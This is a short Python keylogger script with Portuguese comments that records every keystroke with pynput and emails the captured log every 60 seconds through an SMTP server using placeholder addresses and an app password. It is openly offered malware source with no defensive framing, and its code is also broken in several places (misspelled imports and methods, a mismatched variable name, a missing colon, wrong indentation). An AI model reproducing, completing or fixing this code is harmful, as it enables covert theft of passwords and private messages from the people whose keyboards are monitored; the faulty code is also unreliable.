from pynput import keyboard
import smtplib
from email.mimi.text import MIMETest
from threading import Timer

log = ""

# Configurar email
EMAIL_ORIGEM = "EMAIL@XXX.XXX"
EMAIL_ESTINO = "EMAIL.XXX.XXX"
SENHA_EMAIL = "CODIGO APP GOOGLE PASSWORD"

def enviar_email():
  global log
  if log:
    msg = MIMEText(log)
    msg['SUBJECT'] = "Dados capturados pelo keylogger"
    msg['From'] = EMAIL_ORIGEM
    msg['To'] = EMAIL_DESTINO
  try:
    server = smtplib.SMTP("smtp.XXX.XXX", 587)
    server.starttl()
    server.login(EMAIL_ORIGEM, SENHA_EMAIL)
    server.send_message(msg)
    server.quit()
  except Exception as e:
    print("Erro ao enviar", e)

log = ""

# Agendar o envio a cada 60 segundos
Timer(60, enviar_email).start()

def on_press(key):
  global log
  try:
    log+= key.char
  except AttributeError:
    if key == keyboard.key.space:
      log+=" "
    elif key == keyboard.key.enter:
      log +="\n "
    elif key == keyboard.key.backspace:
      log +="[<]"
    else
      pass # Ignorar control, shift, etc...

# Inicia o keylogger e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
  enviar_email()
  listener.join()
